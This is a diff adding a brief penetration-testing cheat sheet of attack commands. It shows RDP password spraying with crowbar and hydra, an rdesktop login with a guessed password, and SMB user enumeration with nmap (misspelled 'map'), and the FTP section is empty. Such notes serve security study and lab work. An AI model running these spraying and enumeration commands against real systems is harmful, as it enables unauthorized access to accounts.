@@ -1,0 +1,20 @@
+Attack Methods
+-------------------------
+FTP
+-------------------------
+
+-------------------------
+RDP
+-------------------------
+RDP Password Spraying
+crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+
+Hydra - RDP Password Spraying
+hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+
+RDP Login
+rdesktop -u admin -p password123 192.168.2.143
+-------------------------
+SMB
+-------------------------
+map -p 139,445 --script smb-enum-users <target>	Use smb-enum-sessions to find logged-in users.
